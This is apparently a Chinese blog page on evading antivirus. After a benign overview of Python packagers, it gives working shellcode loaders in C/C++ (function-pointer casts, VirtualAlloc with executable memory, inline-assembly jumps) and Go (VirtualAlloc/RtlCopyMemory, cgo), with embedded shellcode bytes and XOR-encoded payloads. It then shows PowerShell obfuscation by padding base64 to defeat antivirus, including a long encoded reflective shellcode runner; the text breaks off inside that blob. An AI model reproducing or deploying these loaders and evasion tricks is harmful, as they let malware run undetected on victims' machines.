<h3 id="Python-打包器选择-Pyinstall-Py2exe-Nuitka"><a href="#Python-打包器选择-Pyinstall-Py2exe-Nuitka" class="headerlink" title="#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka"></a>#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、pyinstaller</span><br><span class="line">-F, –onefile 打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用</span><br><span class="line">-D, –onedir 打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护</span><br><span class="line">-K, –tk 在部署时包含 TCL/TK</span><br><span class="line">-a, –<span class="built_in">ascii</span> 不包含编码.在支持Unicode的python版本上默认包含所有的编码.</span><br><span class="line">-d, –debug 产生debug版本的可执行文件</span><br><span class="line">-w,–windowed,–noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</span><br><span class="line">-c,–nowindowed,–console 使用控制台子系统执行(默认)(只对Windows有效)</span><br><span class="line">使用：pyinstaller -F test.py</span><br></pre></td></tr></table></figure>

<h4 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h4><p>参考：<a target="_blank" rel="noopener" href="https://hoxis.github.io/python-py2exe.html">https://hoxis.github.io/python-py2exe.html</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">安装：pip install py2exe</span><br><span class="line">打包：python setup.py py2exe</span><br><span class="line">代码：</span><br><span class="line">setup.py</span><br><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> py2exe</span><br><span class="line">INCLUDES = [<span class="string">&#x27;108-pickle-release&#x27;</span>] <span class="comment">#注意修改脚本项目名</span></span><br><span class="line"> </span><br><span class="line">options = &#123;</span><br><span class="line">    <span class="string">&quot;py2exe&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;compressed&quot;</span>: <span class="number">1</span>,  <span class="comment"># 0或1,1压缩，0不压缩</span></span><br><span class="line">            <span class="string">&quot;optimize&quot;</span>: <span class="number">2</span>,  <span class="comment"># 0、1、2，文件的优化级别</span></span><br><span class="line">            <span class="string">&quot;bundle_files&quot;</span>: <span class="number">1</span>,  <span class="comment"># 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定</span></span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: INCLUDES,  <span class="comment"># 列表，包含其它的一些模块</span></span><br><span class="line">            <span class="string">&quot;dll_excludes&quot;</span>: [<span class="string">&#x27;MSVCP90.dll&#x27;</span>]  <span class="comment"># 列表，包含的dll文件不会打包进exe程序</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">setup(</span><br><span class="line">    version=<span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    options=options,</span><br><span class="line">    description=<span class="string">&quot;this is a xiaodi test&quot;</span>,</span><br><span class="line">    zipfile=<span class="literal">None</span>,  <span class="comment"># 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中</span></span><br><span class="line">    console=[&#123;<span class="string">&quot;script&quot;</span>: <span class="string">&#x27;108-pickle-release.py&#x27;</span>&#125;]  <span class="comment"># 生成一个控制台形式的exe程序，对应的有windows=[]，生成GUI形式的exe程序</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Nuitka"><a href="#Nuitka" class="headerlink" title="Nuitka"></a>Nuitka</h4><p>参考:<a target="_blank" rel="noopener" href="https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7109310663851245605">https://juejin.cn/post/7109310663851245605</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--standalone：方便移植到其他机器，不用再安装python</span><br><span class="line">--show-memory --show-progress：展示整个安装的进度过程</span><br><span class="line">--nofollow-imports：不编译代码中所有的<span class="keyword">import</span></span><br><span class="line">--follow-<span class="keyword">import</span>-to=utils,src：需要编译成C++代码的指定的<span class="number">2</span>个包含源码的文件夹，这里用,来进行分隔。</span><br><span class="line">--output-<span class="built_in">dir</span>=out：指定输出的结果路径为out。</span><br><span class="line">--windows-disable-console：运行exe取消弹框。</span><br><span class="line">--mingw64 <span class="comment">#默认为已经安装的vs2017去编译，否则就按指定的比如mingw(官方建议)</span></span><br><span class="line">--standalone 独立环境，这是必须的(否则拷给别人无法使用)</span><br><span class="line">--windows-disable-console 没有CMD控制窗口</span><br><span class="line">--output-<span class="built_in">dir</span>=out 生成exe到out文件夹下面去</span><br><span class="line">--show-progress 显示编译的进度，很直观</span><br><span class="line">--show-memory 显示内存的占用</span><br><span class="line">--include-qt-plugins=sensible,styles 打包后PyQt的样式就不会变了</span><br><span class="line">--plugin-enable=qt-plugins 需要加载的PyQt插件</span><br><span class="line">--plugin-enable=tk-inter 打包tkinter模块的刚需</span><br><span class="line">--plugin-enable=numpy 打包numpy,pandas,matplotlib模块的刚需</span><br><span class="line">--plugin-enable=torch 打包pytorch的刚需</span><br><span class="line">--plugin-enable=tensorflow 打包tensorflow的刚需</span><br><span class="line">--windows-icon-<span class="keyword">from</span>-ico=你的.ico 软件的图标</span><br><span class="line">--windows-company-name=Windows下软件公司信息</span><br><span class="line">--windows-product-name=Windows下软件名称</span><br><span class="line">--windows-file-version=Windows下软件的信息</span><br><span class="line">--windows-product-version=Windows下软件的产品信息</span><br><span class="line">--windows-file-description=Windows下软件的作用描述</span><br><span class="line">--windows-uac-admin=Windows下用户可以使用管理员权限来安装</span><br><span class="line">--linux-onefile-icon=Linux下的图标位置</span><br><span class="line">--onefile 像pyinstaller一样打包成单个exe文件</span><br><span class="line">--include-package=复制比如numpy,PyQt5 这些带文件夹的叫包或者轮子</span><br><span class="line">--include-module=复制比如when.py 这些以.py结尾的叫模块</span><br><span class="line">使用：nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-<span class="keyword">import</span>-to=utils,src --output-<span class="built_in">dir</span>=out <span class="number">108.</span>py</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="C-加载器"><a href="#C-加载器" class="headerlink" title="C++加载器"></a>C++加载器</h3><p>对于C&#x2F;C++来说，常用的加载方式有<strong>函数指针执行、内联汇编指令、伪指令等方式</strong>.</p>
<h4 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h4><p>简单的C代码:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    (*(<span class="built_in">void</span>(*)() shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>(void(*)() shellcode</strong> 将shellcode转换为函数指针，指向void形式的函数，然后再通过一个*对指针进行取值，之后通过()双括号调用函数进而执行shell从而执行shellocde。</p>
<h4 id="动态内存加载"><a href="#动态内存加载" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> *Memory; </span><br><span class="line">	</span><br><span class="line"> 	Memory=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	</span><br><span class="line"> 	((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和上面python实现类似。</p>
<h4 id="内联汇编指令"><a href="#内联汇编指令" class="headerlink" title="内联汇编指令"></a>内联汇编指令</h4><p>汇编指令相关的知识可以看这里:</p>
<p><a target="_blank" rel="noopener" href="https://www.cxyzjd.com/article/Hkenter/2855771">https://www.cxyzjd.com/article/Hkenter/2855771</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)  // 隐藏控制台窗口显示</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCREMENTAL:NO&quot;</span>)                                     <span class="comment">// 减小编译体积</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)                                 <span class="comment">// 启用数据段可读写</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xd9\xc5\xd9\x74\x24\xf4\xba\x8b\xfc\x02\xdd\x5e\x2b\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x9f\x1e\xf7\x21\x77\x5c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xd9\x87\x01\x70\x3c\xb6\x01\xe6\x34\xe8\xb1\x6c\x18\x04&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\x20\x89\x9f\x4f\xed\xbe\x28\xe5\xcb\xf1\xa9\x56\x2f\x93&quot;</span></span><br><span class="line"><span class="string">&quot;\xca\xec\x3f\xcd\x34\xa2\x40\xc4&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		  mov eax, offset shellcode;</span><br><span class="line">		  JMP EAX</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他写法</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">        &#123;  </span><br><span class="line">        lea eax, shellcode;  </span><br><span class="line">    jmp eax;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>MOV EAX, offset shellcode</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>此指令意为将 shellcode 放入到寄存器 EAX 中</p>
<p><strong>JMP EAX</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>无条件跳转到EAX</p>
<h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>伪指令(Pseudo Instruction)是用于对汇编过程进行控制的指令，该类指令并不是可执行指令，没有机器代码，只用于汇编过程中为汇编程序提供汇编信息。 例如，提供如下信息：哪些是指令、哪些是数据及数据的字长、程序的起始地址和结束地址等。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode_5</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        mov eax, offset shellcode;  </span><br><span class="line">        _emit <span class="number">0xFF</span>;  </span><br><span class="line">        _emit <span class="number">0xE0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="go加载器"><a href="#go加载器" class="headerlink" title="go加载器"></a>go加载器</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/newbe3three/p/16214882.html">https://www.cnblogs.com/newbe3three/p/16214882.html</a></p>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/981565.html">https://cn-sec.com/archives/981565.html</a></p>
<h4 id="动态内存加载-1"><a href="#动态内存加载-1" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><p>核心代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">package main</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="string">&quot;unsafe&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	MEM_COMMIT             = <span class="number">0x1000</span></span></span></span><br><span class="line"><span class="params"><span class="function">	MEM_RESERVE            = <span class="number">0x2000</span></span></span></span><br><span class="line"><span class="params"><span class="function">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">	VirtualAlloc  = kernel<span class="number">32.</span>MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">	addr, _, err := VirtualAlloc.<span class="built_in">Call</span>(<span class="number">0</span>, <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _, err = RtlCopyMemory.<span class="built_in">Call</span>(addr, (uintptr)(unsafe.<span class="built_in">Pointer</span>(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)))</span><br><span class="line">	<span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	syscall.<span class="built_in">Syscall</span>(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 其实原理与上面python或者C&#x2F;C++类似。</p>
<p>通过声明匿名函数,然后指向读入的ShellCode字节数据的那片内存，并将内存设置为可读可写可执行，之后调用函数就将ShellCode运行起来了。</p>
<p>可以利用加密混淆shellcode，也可以利用不同的加载器代码去写加载器、、</p>
<p>加壳工具（SafengineShielden）</p>
<h4 id="内联C加载"><a href="#内联C加载" class="headerlink" title="内联C加载"></a>内联C加载</h4><p>核心代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="built_in">byte</span>(buf)</span><br><span class="line">    C.<span class="built_in">call</span>((*C.<span class="type">char</span>)(unsafe.<span class="built_in">Pointer</span>(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>手工混淆：</p>
<p>填充垃圾数据</p>
<p>直接在base64编码上添加，然后解码前进行还原（为了让杀毒判断失效）</p>
<p>直接在原型代码上添加，然后解码还原（可过火绒） </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0RE1pTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNZEVkcGRDUHBpT3BMK0syTm